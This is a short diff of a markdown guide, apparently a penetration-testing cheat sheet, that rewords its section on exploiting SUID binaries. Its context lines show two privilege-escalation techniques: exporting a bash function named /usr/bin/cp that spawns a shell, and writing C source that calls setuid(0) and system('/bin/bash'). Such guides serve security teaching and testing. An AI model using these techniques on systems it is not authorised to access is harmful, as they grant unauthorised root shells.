@@ -34,12 +34,11 @@ bash-4.2$: ls /usr/bin/update_my_docs -alh
 
 ### Exploiting SUID
 
-For some unix binaries that can be exploited you may find in GTFOBins project.
-For custome-made binaries the process may be as following:
+Exploiting SUIDs binaries is very simple and there are two diffrent techniques to use it.
 
 #### Bash Function Manipulation
 
-In this techniques, we'll create/export a bash function matching one of the programs called by the program (i.e., "/usr/bin/cp"):
+In this technique, we'll export a bash function matching one of the programs called by the program (i.e., "/usr/bin/cp"):
 
 ```
 function /usr/bin/cp(){ /bin/sh; }
@@ -50,7 +49,7 @@ Then we'll execute our program /usr/bin/update_my_docs to get our shell.
 
 #### Create Binary SUID
 
-In this trick, we'll create a SUID bianry as following:
+In this method, we'll create a SUID bianry as following:
 
 ```
 echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/bash");\n}' > /tmp/setuid.c
